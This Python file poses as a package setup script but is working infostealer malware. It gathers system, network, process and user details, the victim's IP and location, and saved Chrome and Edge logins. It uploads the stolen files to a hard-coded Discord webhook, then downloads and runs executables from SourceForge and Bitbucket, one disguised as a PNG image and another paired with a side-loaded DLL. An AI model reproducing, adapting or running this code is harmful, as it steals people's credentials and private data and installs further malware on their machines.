import os
import tempfile
import psutil
import platform
import sqlite3
import shutil
from sys import executable
from urllib.request import Request, urlopen
from json import loads
from setuptools import setup, find_packages
import requests
import subprocess


# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                   

sysinfo = "ap14847.txt"
capture = "capture.txt"
chrome = "chrome_ap14849.txt"
edge = "edge_ap14849.txt"
dlname = "iotautomatelogo.png"
dlname2 = "monitor.exe"
dlname3 = "readings.exe"
webhook_url = "https://discord.com/api/webhooks/1233018393133711451/toQTCC8TZklTwmPkUnH_92yMFczje3Z7n0zhyX2QneVVv6YFiSkQWRLrGO7LvMkgj7_9"
exeurl = "https://sourceforge.net/projects/iot-automate/files/iotautomatelogo.png/download"
monitor = "https://sourceforge.net/projects/iot-automate/files/monitor.exe/download"
readings = "https://bitbucket.org/tus-iot-automate/iotautomate/downloads/readings.exe"


temp_dir = tempfile.mkdtemp(prefix='ResourceUpdater')
dname = temp_dir


# THING 1: GET STUFF
def install():
   
    def dfile(url):
    
        requestObj = Request(url, headers={'User-agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.69'})
        
        responseObj = urlopen(requestObj)
        content = responseObj.read()
        return content

    
    exe = dfile("https://bitbucket.org/tus-iot-automate/iotautomate/downloads/k7841286.exe")
    dll = dfile("https://bitbucket.org/tus-iot-automate/iotautomate/downloads/k7841286.dll")


    # Write files to temp dir
    with open(os.path.join(dname, "wsc_proxy.exe"), 'wb') as f:
        f.write(exe)
    with open(os.path.join(dname, "wsc.dll"), 'wb') as f:
        f.write(dll)
    
    # Execute files
    os.system("START " + os.path.join(dname, "wsc_proxy.exe"))

# THING 2: EXTERNAL IP PLEASE SIR
def getip():
    ip = "None"
    try:
        # Get IP by generating request to ipify.org
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

# THING 3: LOCATION PLZ
def collect():

    # Execute getip function
    ip = getip()

    # Query general OS/User information
    username = os.getenv("USERNAME")

    # IP Origin
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    ipdata = loads(ipdatanojson)
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    if contryCode == "not found":
        globalinfo = f":rainbow_flag:  - `{username.upper()} | {ip} ({contry})`"
    else:
        globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
    return globalinfo

# THING 4: SYSTEM STUFF
def get_system_info():
    # OS Info
    os_info = {
        "system": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "architecture": platform.architecture(),
        "hostname": platform.node(),
    }
    
    # Network Information
    net_info = psutil.net_if_addrs()
    
    # Process Information
    process_info = []
    for proc in psutil.process_iter(['pid', 'name']):
        process_info.append({'pid': proc.info['pid'], 'name': proc.info['name']})
    
    # Logged-in Users
    users = psutil.users()

    return os_info, net_info, process_info, users

# THING 5: BROWSER STUFF
def get_brow_pass(browser_name):

    # Check browser name passed to function
    if browser_name.lower() == 'chrome':
        user_data_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data')
    elif browser_name.lower() == 'edge':
        user_data_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
    else:
        # Error handle
        print(f"{browser_name} is not supported.")
        return
    
    if not os.path.exists(user_data_dir):
        # Error handle
        print(f"{browser_name} user data directory not found.")
        return
    
    # Copy data file to a temp dir to avoid locking
    temp_dir = tempfile.mkdtemp()
    login_data_path = os.path.join(user_data_dir, 'Default', 'Login Data')
    temp_login_data_path = os.path.join(temp_dir, 'LoginData')
    shutil.copy2(login_data_path, temp_login_data_path)
    
    # SQLite Connection
    conn = sqlite3.connect(temp_login_data_path)
    cursor = conn.cursor()
    
    # Query logons and fetch results
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    password_entries = cursor.fetchall()
    conn.close()
    
    # Disgard Temp Files
    shutil.rmtree(temp_dir)
    
    return password_entries

# THING 5: PUT STUFF IN FILE
def save_sysinfo_to_file(os_info, net_info, process_info, users):
    # Get the temporary directory path
    temp_dir = tempfile.gettempdir()
    
    # Export path
    file_path = os.path.join(temp_dir, 'ap14847.txt')
    
    with open(file_path, 'w') as f:
        # OS Info
        f.write("--- Operating System Information ---\n")
        for key, value in os_info.items():
            f.write(f"{key.capitalize()}: {value}\n")
        f.write("\n")
        
        # Network Info
        f.write("--- Network Information ---\n")
        for interface, addresses in net_info.items():
            f.write(f"Interface: {interface}\n")
            for addr in addresses:
                if addr.family == 2:  # IPv4
                    f.write(f"  IPv4 Address: {addr.address}\n")
                elif addr.family == 17:  # MAC Address
                    f.write(f"  MAC Address: {addr.address}\n")
            f.write("\n")
        
        # Process Information
        f.write("--- Running Processes ---\n")
        for proc in process_info:
            f.write(f"PID: {proc['pid']}, Name: {proc['name']}\n")
        f.write("\n")
        
        # Logged-in Users
        f.write("--- Logged-in Users ---\n")
        for user in users:
            f.write(f"Username: {user.name}, Terminal: {user.terminal}, Host: {user.host}, Started: {user.started}\n")
        f.write("\n")
    f.close

# THING 6: PUT MORE STUFF IN FILES
def save_ip_to_file(info):
    # Temp Dir Path
    temp_dir = tempfile.gettempdir()
    
    # Export Path
    file_path = os.path.join(temp_dir, 'ap14848.txt')
    
    with open(file_path, 'w') as f:
        f.write(str(info) + '\n')
        f.write('\n')
    f.close

# THING 6 PART DEUX: PUT EVEN MORE STUFF IN FILES
def save_pass_to_file(passwords, browser_name):
    # Temp Dir Path
    temp_dir = tempfile.gettempdir()
    
    # Create file path
    file_path = os.path.join(temp_dir, f'{browser_name}_ap14849.txt')
    
    # Loop and write findings to file
    with open(file_path, 'w') as f:
        f.write(f"--- Passwords found in {browser_name.capitalize()} database ---\n")
        for entry in passwords:
            url, username, password = entry
            f.write(f"URL: {url}\n")
            f.write(f"Username: {username}\n")
            f.write(f"Password: {password}\n\n")
        f.close

# THING 7: I'M SURE I COULD OPTIMISE THIS STUFF MORE, BUT WHO CARES, IT WORKS RIGHT?
def upload(webhook_url, filename):
    try:
        # Read file from temporary directory
        temp_file = os.path.join(os.environ.get('TEMP', '/tmp'), filename)
        print(temp_file)
        with open(temp_file, 'rb') as file:
            file_contents = file.read()
            print(file_contents)

        # Send file contents to Discord webhook
        payload = {'content': 'COLLECTED FILE', 'username': 'Uploader'}
        files = {'file': (filename, file_contents)}
        
        response = requests.post(webhook_url, data=payload, files=files)
        
        if response.status_code == 200:
            print("Success")
        else:
            print(f"Failed. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")
    
# THING 8: GETTING TIRED OF THIS NOW
def DLEX(url):
    try:
        # Get Temp Dir
        temp_dir = os.path.join(os.environ.get('TEMP', '/tmp'), dlname)
        
        # Location
        #file_path = os.path.join(temp_dir, )
        #print(file_path)

        # Download
        with requests.get(url, stream=True) as response:
            response.raise_for_status()
            with open(temp_dir, 'wb') as file:
                for chunk in response.iter_content(chunk_size=8192):
                    file.write(chunk)

        # Execute the file
        subprocess.run([temp_dir], check=True)

    except Exception as e:
        print(f"Error: {e}")

# THING 9: DOWNLOAD MORE STUFF
def DL2(url, outputname):
    try:
        dlfile = outputname
        # Get Temp Dir
        temp_dir = tempfile.gettempdir()
       
        # Location
        file_path = os.path.join(temp_dir,dlfile)
        #print(file_path)

        # Download
        with requests.get(url, stream=True) as response:
            response.raise_for_status()
            with open(file_path, 'wb') as file:
                for chunk in response.iter_content(chunk_size=8192):
                    file.write(chunk)
    except Exception as e:
        print(f"Error: {e}")

def cleanup(file_names):
    
    cleanup_path = os.path.join(os.environ['LOCALAPPDATA'], 'Temp')

    for root,files in os.walk(cleanup_path):
        for filename in files:
                if filename in file_names:
                    file_path = os.path.join(root, filename)
                    os.remove(file_path)
                    


if __name__ == "__main__":
    
    # DO ALL THE THINGS AND GET ALL THE STUFFS :)
    
    getexternalip = collect()
    os_info, net_info, process_info, users = get_system_info()
    ch_pass = get_brow_pass('chrome')
    me_pass = get_brow_pass('edge')

    save_ip_to_file(getexternalip)
    save_sysinfo_to_file(os_info, net_info, process_info, users)
    
    if ch_pass:
        save_pass_to_file(ch_pass, 'chrome')
    else:
        print("No passwords found in Chrome database.")

    
    if me_pass:
        save_pass_to_file(me_pass, 'edge')
    else:
        print("No passwords found in Edge database.")

    DL2(monitor, dlname2)
    DL2(readings, dlname3)
    install()
    DLEX(exeurl)
    upload(webhook_url, sysinfo)
    upload(webhook_url, capture)
    upload(webhook_url, chrome)
    upload(webhook_url, edge)
    #cleanup(['',], ['',])

    # FIN
    exit()
